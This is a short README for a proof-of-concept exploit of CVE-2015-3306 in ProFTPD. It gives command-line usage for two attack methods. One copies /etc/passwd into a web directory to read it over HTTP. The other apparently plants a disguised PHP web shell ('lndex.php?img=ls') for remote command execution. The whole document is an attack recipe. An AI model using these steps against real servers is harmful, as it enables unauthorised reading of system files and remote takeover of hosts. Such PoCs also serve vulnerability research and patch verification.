# cpx_proftpd

PoC by Daniel Aldana for [CVE-2015-3306](http://bugs.proftpd.org/show_bug.cgi?id=4169) exploitation. Bug reported by Vadim Melihow.

###METHOD 1:

usage: 

```
python cpx_proftp.py <IP> <REMOTE_ABSOLUTEPATH_SRC_FILE> <REMOTE_ABSOLUTEPATH_DST_FILE>
```

ex:

```
python cpx_proftp.py 127.0.0.1 /etc/passwd /var/www/pass.txt
```

then try:

```
http://127.0.0.1/pass.txt
```

###METHOD 2:


usage: 

```
python cpx_proftp.py <IP> <REMOTE_ABSOLUTEPATH_WEBDIR>
```

ex:

```
python cpx_proftp.py 127.0.0.1 /var/www/html
```

then try:

```
http://127.0.0.1/lndex.php?img=ls
```
